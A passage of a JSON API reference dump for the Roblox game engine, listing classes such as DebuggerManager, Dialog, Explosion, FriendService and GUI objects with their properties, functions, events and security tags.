,{"ValueType":"bool","type":"Property","Name":"IsEnabled","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"int","type":"Property","Name":"Line","tags":["readonly"],"Class":"DebuggerBreakpoint"},{"Superclass":"Instance","type":"Class","Name":"DebuggerManager","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"DebuggingEnabled","tags":["readonly"],"Class":"DebuggerManager"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"script","Default":null}],"Name":"AddDebugger","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableDebugging","tags":["LocalUserSecurity"],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetDebuggers","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":[],"Class":"DebuggerManager","type":"Function"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerAdded","tags":[],"Class":"DebuggerManager","type":"Event"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerRemoved","tags":[],"Class":"DebuggerManager","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DebuggerWatch","tags":[]},{"ValueType":"string","type":"Property","Name":"Expression","tags":[],"Class":"DebuggerWatch"},{"ReturnType":"void","Arguments":[],"Name":"CheckSyntax","tags":[],"Class":"DebuggerWatch","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Dialog","tags":[]},{"ValueType":"float","type":"Property","Name":"ConversationDistance","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"Dialog"},{"ValueType":"bool","type":"Property","Name":"InUse","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"InitialPrompt","tags":[],"Class":"Dialog"},{"ValueType":"DialogPurpose","type":"Property","Name":"Purpose","tags":[],"Class":"Dialog"},{"ValueType":"DialogTone","type":"Property","Name":"Tone","tags":[],"Class":"Dialog"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Instance","Name":"dialogChoice","Default":null}],"Name":"SignalDialogChoiceSelected","tags":["RobloxScriptSecurity"],"Class":"Dialog","type":"Function"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"dialogChoice","Type":"Instance"}],"Name":"DialogChoiceSelected","tags":[],"Class":"Dialog","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DialogChoice","tags":[]},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"ResponseDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"UserDialog","tags":[],"Class":"DialogChoice"},{"Superclass":"Instance","type":"Class","Name":"DoubleConstrainedValue","tags":[]},{"ValueType":"double","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MaxValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MinValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"DoubleConstrainedValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"DoubleConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"DoubleConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Dragger","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Axis","Name":"axis","Default":"X"}],"Name":"AxisRotate","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"mousePart","Default":null},{"Type":"Vector3","Name":"pointOnMousePart","Default":null},{"Type":"Objects","Name":"parts","Default":null}],"Name":"MouseDown","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Ray","Name":"mouseRay","Default":null}],"Name":"MouseMove","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MouseUp","tags":[],"Class":"Dragger","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Explosion","tags":[]},{"ValueType":"float","type":"Property","Name":"BlastPressure","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"BlastRadius","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"DestroyJointRadiusPercent","tags":[],"Class":"Explosion"},{"ValueType":"ExplosionType","type":"Property","Name":"ExplosionType","tags":[],"Class":"Explosion"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Explosion"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"distance","Type":"float"}],"Name":"Hit","tags":[],"Class":"Explosion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"FaceInstance","tags":["notbrowsable"]},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"FaceInstance"},{"Superclass":"FaceInstance","type":"Class","Name":"Decal","tags":[]},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Shiny","tags":["deprecated"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Specular","tags":["deprecated"],"Class":"Decal"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"Decal"},{"Superclass":"Decal","type":"Class","Name":"Texture","tags":[]},{"ValueType":"float","type":"Property","Name":"StudsPerTileU","tags":[],"Class":"Texture"},{"ValueType":"float","type":"Property","Name":"StudsPerTileV","tags":[],"Class":"Texture"},{"Superclass":"Instance","type":"Class","Name":"Feature","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"FaceId","tags":[],"Class":"Feature"},{"ValueType":"InOut","type":"Property","Name":"InOut","tags":[],"Class":"Feature"},{"ValueType":"LeftRight","type":"Property","Name":"LeftRight","tags":[],"Class":"Feature"},{"ValueType":"TopBottom","type":"Property","Name":"TopBottom","tags":[],"Class":"Feature"},{"Superclass":"Feature","type":"Class","Name":"Hole","tags":["deprecated"]},{"Superclass":"Feature","type":"Class","Name":"MotorFeature","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Fire","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Fire"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Heat","tags":[],"Class":"Fire"},{"ValueType":"Color3","type":"Property","Name":"SecondaryColor","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"size","tags":["deprecated"],"Class":"Fire"},{"Superclass":"Instance","type":"Class","Name":"FlagStandService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FlyweightService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"CSGDictionaryService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"NonReplicatedCSGDictionaryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Folder","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ForceField","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FriendService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBreakFriendUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetCreateFriendRequestUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetDeleteFriendRequestUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetEnabled","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetFriendsOnlineUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetGetFriendsUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetMakeFriendUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"FunctionalTest","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"FunctionalTest"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Error","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Failed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Pass","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Passed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Warn","tags":[],"Class":"FunctionalTest","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"GamePassService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"playerHasPassUrl","Default":null}],"Name":"SetPlayerHasPassUrl","tags":["LocalUserSecurity"],"Class":"GamePassService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"gamePassId","Default":null}],"Name":"PlayerHasPass","tags":[],"Class":"GamePassService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GameSettings","tags":["notbrowsable"]},{"ValueType":"float","type":"Property","Name":"BubbleChatLifetime","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"BubbleChatMaxBubbles","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatScrollLength","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"CollisionSoundEnabled","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"float","type":"Property","Name":"CollisionSoundVolume","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"HardwareMouse","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"MaxCollisionSounds","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ReportAbuseChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoftwareSound","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoundEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"VideoCaptureEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"VideoQualitySettings","type":"Property","Name":"VideoQuality","tags":[],"Class":"GameSettings"},{"Arguments":[{"Name":"recording","Type":"bool"}],"Name":"VideoRecordingChangeRequest","tags":["RobloxScriptSecurity"],"Class":"GameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"GamepadService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Geometry","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GlobalDataStore","tags":[]},{"ReturnType":"Connection","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"callback","Default":null}],"Name":"OnUpdate","tags":[],"Class":"GlobalDataStore","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"int","Name":"delta","Default":"1"}],"Name":"IncrementAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"transformFunction","Default":null}],"Name":"UpdateAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"Superclass":"GlobalDataStore","type":"Class","Name":"OrderedDataStore","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"bool","Name":"ascending","Default":null},{"Type":"int","Name":"pagesize","Default":null},{"Type":"Variant","Name":"minValue","Default":null},{"Type":"Variant","Name":"maxValue","Default":null}],"Name":"GetSortedAsync","tags":[],"Class":"OrderedDataStore","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GroupService","tags":["notCreatable"]},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetAlliesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetEnemiesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetGroupInfoAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGroupsAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GuiBase","tags":[]},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase2d","tags":["notbrowsable"]},{"ValueType":"Vector2","type":"Property","Name":"AbsolutePosition","tags":["readonly"],"Class":"GuiBase2d"},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteSize","tags":["readonly"],"Class":"GuiBase2d"},{"Superclass":"GuiBase2d","type":"Class","Name":"GuiObject","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BackgroundColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BackgroundColor3","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"BackgroundTransparency","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BorderColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BorderColor3","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"BorderSizePixel","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"ClipsDescendants","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Draggable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionDown","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionLeft","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionRight","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionUp","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Position","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Rotation","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Selectable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"GuiObject"},{"ValueType":"SizeConstraint","type":"Property","Name":"SizeConstraint","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":["hidden"],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"GuiObject"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenPosition","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSize","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSizeAndPosition","tags":[],"Class":"GuiObject","type":"Function"},{"Arguments":[{"Name":"initialPosition","Type":"UDim2"}],"Name":"DragBegin","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"DragStopped","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputBegan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputChanged","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputEnded","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseEnter","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseLeave","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseMoved","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelBackward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseWheelForward","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionGained","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[],"Name":"SelectionLost","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchLongPress","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"totalTranslation","Type":"Vector2"},{"Name":"velocity","Type":"Vector2"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPan","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"scale","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchPinch","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"},{"Name":"rotation","Type":"float"},{"Name":"velocity","Type":"float"},{"Name":"state","Type":"UserInputState"}],"Name":"TouchRotate","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"swipeDirection","Type":"SwipeDirection"},{"Name":"numberOfTouches","Type":"int"}],"Name":"TouchSwipe","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"touchPositions","Type":"Array"}],"Name":"TouchTap","tags":[],"Class":"GuiObject","type":"Event"},{"Superclass":"GuiObject","type":"Class","Name":"Frame","tags":[]},{"ValueType":"FrameStyle","type":"Property","Name":"Style","tags":[],"Class":"Frame"},{"Superclass":"GuiObject","type":"Class","Name":"GuiButton","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"AutoButtonColor","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Modal","tags":[],"Class":"GuiButton"},{"ValueType":"bool","type":"Property","Name":"Selected","tags":[],"Class":"GuiButton"},{"ValueType":"ButtonStyle","type":"Property","Name":"Style","tags":[],"Class":"GuiButton"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"verb","Default":null}],"Name":"SetVerb","tags":["RobloxScriptSecurity"],"Class":"GuiButton","type":"Function"},{"Arguments":[],"Name":"MouseButton1Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton1Up","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[],"Name":"MouseButton2Click","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Down","tags":[],"Class":"GuiButton","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"MouseButton2Up","tags":[],"Class":"GuiButton","type":"Event"},{"Superclass":"GuiButton","type":"Class","Name":"ImageButton","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageButton"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageButton"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageButton"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageButton"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageButton"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageButton"},{"Superclass":"GuiButton","type":"Class","Name":"TextButton","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextButton"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextButton"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextButton"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextButton"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextButton"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextButton"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextButton"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextButton"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextButton"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextButton"},{"Superclass":"GuiObject","type":"Class","Name":"GuiLabel","tags":[]},{"Superclass":"GuiLabel","type":"Class","Name":"ImageLabel","tags":[]},{"ValueType":"Content","type":"Property","Name":"Image","tags":[],"Class":"ImageLabel"},{"ValueType":"Color3","type":"Property","Name":"ImageColor3","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectOffset","tags":[],"Class":"ImageLabel"},{"ValueType":"Vector2","type":"Property","Name":"ImageRectSize","tags":[],"Class":"ImageLabel"},{"ValueType":"float","type":"Property","Name":"ImageTransparency","tags":[],"Class":"ImageLabel"},{"ValueType":"ScaleType","type":"Property","Name":"ScaleType","tags":[],"Class":"ImageLabel"},{"ValueType":"Rect2D","type":"Property","Name":"SliceCenter","tags":[],"Class":"ImageLabel"},{"Superclass":"GuiLabel","type":"Class","Name":"TextLabel","tags":[]},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextLabel"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextLabel"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextLabel"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextLabel"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextLabel"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextLabel"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextLabel"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextLabel"},{"Superclass":"GuiObject","type":"Class","Name":"Scale9Frame","tags":[]},{"ValueType":"Vector2int16","type":"Property","Name":"ScaleEdgeSize","tags":[],"Class":"Scale9Frame"},{"ValueType":"string","type":"Property","Name":"SlicePrefix","tags":[],"Class":"Scale9Frame"},{"Superclass":"GuiObject","type":"Class","Name":"ScrollingFrame","tags":[]},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteWindowSize","tags":["readonly"],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"BottomImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Vector2","type":"Property","Name":"CanvasPosition","tags":[],"Class":"ScrollingFrame"},{"ValueType":"UDim2","type":"Property","Name":"CanvasSize","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"MidImage","tags":[],"Class":"ScrollingFrame"},{"ValueType":"int","type":"Property","Name":"ScrollBarThickness","tags":[],"Class":"ScrollingFrame"},{"ValueType":"bool","type":"Property","Name":"ScrollingEnabled","tags":[],"Class":"ScrollingFrame"},{"ValueType":"Content","type":"Property","Name":"TopImage","tags":[],"Class":"ScrollingFrame"},{"Superclass":"GuiObject","type":"Class","Name":"TextBox","tags":[]},{"ValueType":"bool","type":"Property","Name":"ClearTextOnFocus","tags":[],"Class":"TextBox"},{"ValueType":"Font","type":"Property","Name":"Font","tags":[],"Class":"TextBox"},{"ValueType":"FontSize","type":"Property","Name":"FontSize","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"MultiLine","tags":[],"Class":"TextBox"},{"ValueType":"string","type":"Property","Name":"Text","tags":[],"Class":"TextBox"},{"ValueType":"Vector2","type":"Property","Name":"TextBounds","tags":["readonly"],"Class":"TextBox"},{"ValueType":"BrickColor","type":"Property","Name":"TextColor","tags":["deprecated","hidden"],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextColor3","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextFits","tags":["readonly"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextScaled","tags":[],"Class":"TextBox"},{"ValueType":"Color3","type":"Property","Name":"TextStrokeColor3","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextStrokeTransparency","tags":[],"Class":"TextBox"},{"ValueType":"float","type":"Property","Name":"TextTransparency","tags":[],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrap","tags":["deprecated"],"Class":"TextBox"},{"ValueType":"bool","type":"Property","Name":"TextWrapped","tags":[],"Class":"TextBox"},{"ValueType":"TextXAlignment","type":"Property","Name":"TextXAlignment","tags":[],"Class":"TextBox"},{"ValueType":"TextYAlignment","type":"Property","Name":"TextYAlignment","tags":[],"Class":"TextBox"},{"ReturnType":"void","Arguments":[],"Name":"CaptureFocus","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsFocused","tags":[],"Class":"TextBox","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ReleaseFocus","tags":[],"Class":"TextBox","type":"Function"},{"Arguments":[{"Name":"enterPressed","Type":"bool"},{"Name":"inputThatCausedFocusLoss","T